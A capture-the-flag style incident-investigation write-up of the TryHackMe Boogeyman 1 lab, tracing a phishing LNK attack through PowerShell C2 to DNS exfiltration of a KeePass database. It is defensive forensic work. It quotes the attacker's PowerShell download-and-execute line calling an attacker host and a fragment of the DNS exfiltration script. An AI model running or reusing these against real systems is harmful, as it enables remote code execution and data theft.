# Boogeyman 1 — Phishing to DNS Exfiltration

**Platform:** TryHackMe | **Room:** [Boogeyman 1](https://tryhackme.com/room/boogeyman1)  
**Role:** SOC Level 1 / Incident Investigation  
**Tools:** Thunderbird, `lnkparse`, `jq`, TShark, Wireshark, Linux CLI

## Investigation Overview

Investigated a targeted phishing incident against a finance employee at Quick Logistics LLC. The attacker impersonated a business partner, delivered an encrypted ZIP containing a malicious Windows shortcut, established a PowerShell-based C2 channel, enumerated the host, accessed Sticky Notes, and attempted to exfiltrate a KeePass database through DNS queries.

**Evidence reviewed:** `dump.eml`, `powershell.json`, and `capture.pcapng`.

## Attack Timeline and Findings

| Stage | Evidence | Finding |
|---|---|---|
| Initial access | Email headers, `dump.eml` | Email from `agriffin@bpakcaging.xyz` to a finance employee; invoice-themed social engineering. Sender domain differs from `bpackaging.xyz` in the email signature. |
| Payload delivery | `Invoice.zip` | Password-protected archive contained `Invoice_20230103.lnk`. |
| Execution | `lnkparse` | Shortcut targeted `powershell.exe` with `-nop -windowstyle hidden -enc`, and used an Excel-like icon. |
| Downloader | Decoded Base64 | `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')` |
| Command & control | PowerShell logs and HTTP traffic | `cdn.bpakcaging.xyz:8080`; periodic HTTP requests, with command output returned using `POST /27fe2489`. |
| Host discovery | PowerShell script blocks | Download and execution of `sb.exe`, consistent with the Seatbelt enumeration tool. |
| Local data access | PowerShell logs and HTTP C2 output | `sq3.exe` used to query the `NOTE` table inside the Microsoft Sticky Notes `plum.sqlite` database. |
| Credential exposure | Decoded C2 output | A Sticky Notes entry labelled **Master Password** exposed the KeePass database password. **Password intentionally redacted.** |
| Exfiltration attempt | PowerShell logs and DNS PCAP | `protected_data.kdbx` read as bytes, hex-encoded, split into chunks, and embedded in DNS A queries using `nslookup`. |
| Recovered artefact | DNS reconstruction | Recovered a 2,206-byte file recognized as a KeePass KDBX 2.x database. Sensitive financial details are not reproduced here. |

## Selected Investigation Commands

### Inspect phishing headers and attachment

```bash
grep -iE '^(From|To|Reply-To|Return-Path|Subject|Date):' dump.eml
unzip -l Invoice.zip
lnkparse lnk-analysis/Invoice_20230103.lnk
```

Decoded PowerShell shortcut command:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

### Investigate PowerShell script blocks

```bash
jq -r '.ScriptBlockText | strings' powershell.json | grep -i 'bpakcaging'
jq -r '.ScriptBlockText | strings' powershell.json | grep -i -C 3 'sq3.exe'
```

The SQLite query searched for notes:

```sql
SELECT * FROM NOTE LIMIT 100;
```

The accessed database was located at:

```text
C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

### Correlate C2 and HTTP traffic

```bash
tshark -r capture.pcapng -Y 'http.response && ip.src == 167.71.211.113 && http.server' \
  -T fields -e http.server | sort -u

tshark -r capture.pcapng -Y 'http.request.method == "POST" && tcp.port == 8080' \
  -T fields -e frame.number -e tcp.stream -e http.request.uri
```

The file-hosting service advertised `SimpleHTTP/0.6 Python/3.10.7`. C2 command responses were sent in HTTP POST bodies as **space-separated decimal UTF-8 byte values**.

### Identify and reconstruct DNS-carried data

PowerShell converted binary data to hexadecimal and generated DNS A queries:

```powershell
$hex = ($bytes | ForEach-Object ToString X2) -join ''
$split = $hex -split '(\S{50})'
# Subsequent nslookup A queries included each chunk in a subdomain.
```

TShark extraction of distinct hexadecimal labels, preserving capture order:

```bash
tshark -r capture.pcapng \
  -Y 'dns.flags.response == 0 && ip.dst == 167.71.211.113 && dns.qry.name matches "^[0-9A-Fa-f]+\\.bpakcaging\\.xyz$"' \
  -T fields -e dns.qry.name \
  | awk -F. '!seen[$1]++ {print $1}' > dns_chunks.txt

tr -d '\n' < dns_chunks.txt | xxd -r -p > recovered.kdbx
file recovered.kdbx
wc -c recovered.kdbx
```

**Observed:** 89 unique hexadecimal DNS labels, 4,412 hex characters, equivalent to **2,206 bytes**. The recovered file was identified by `file` as a **KeePass password database 2.x KDBX**, and its length matched the source file size visible in C2 output. Matching size and format strongly support reconstruction; an original-file hash comparison was not available.

## Indicators of Compromise (Lab)

| Type | IOC | Context |
|---|---|---|
| Sender domain | `bpakcaging.xyz` | Phishing sender and DNS exfiltration domain |
| File hosting | `files.bpakcaging.xyz` | PowerShell and executable downloads |
| C2 domain | `cdn.bpakcaging.xyz` | HTTP C2 on TCP/8080 |
| DNS target | `167.71.211.113` | Explicit resolver destination in the exfiltration command; also observed in the PCAP |
| C2 IP | `159.89.205.40` | Seen in reconstructed HTTP C2 stream |
| File | `Invoice_20230103.lnk` | Malicious Windows shortcut |
| Executables | `sb.exe`, `sq3.exe` | Enumeration and SQLite access |
| Target file | `protected_data.kdbx` | KeePass database targeted for exfiltration |

## MITRE ATT&CK Mapping

| Technique | ID | Supporting evidence |
|---|---|---|
| Spearphishing Attachment | T1566.001 | Invoice-themed email with encrypted ZIP |
| User Execution: Malicious File | T1204.002 | Shortcut requiring user interaction |
| PowerShell | T1059.001 | Encoded PowerShell downloader and C2 loop |
| Ingress Tool Transfer | T1105 | Downloads of additional executables |
| System Information Discovery | T1082 | Seatbelt enumeration activity |
| Exfiltration Over Unencrypted Non-C2 Protocol | T1048.003 | Hexadecimal chunks carried in DNS requests |

## Impact and Analyst Assessment

The investigation established a credible attack chain from phishing through command execution, C2 activity, local reconnaissance, access to sensitive notes, and DNS-based data transfer. The DNS payload reconstructed to a KDBX file matching the observed original size, while the C2 output exposed its master password. This represents a **high-risk credential and financial-data exposure scenario**.

**Recommended response:** isolate the affected endpoint, block the attack infrastructure, review DNS and proxy logs for additional affected systems, rotate exposed credentials, investigate access to related services, and preserve relevant artefacts for forensic review.

## Key Lessons Learned

- SPF/DKIM success does **not** prove that a sender or attachment is safe.
- A `.lnk` shortcut can disguise PowerShell execution as a document.
- PowerShell logs and PCAP data provide complementary evidence: intended commands versus observed traffic.
- DNS queries may carry encoded data in subdomain labels; count distinct data chunks, not just packets.
- Forensic conclusions must separate **attempted exfiltration**, **network transmission**, and **confirmed receipt/use**.

---

*Lab documentation for learning and portfolio purposes. Real credentials, card numbers, and master passwords are deliberately excluded from this public write-up.*
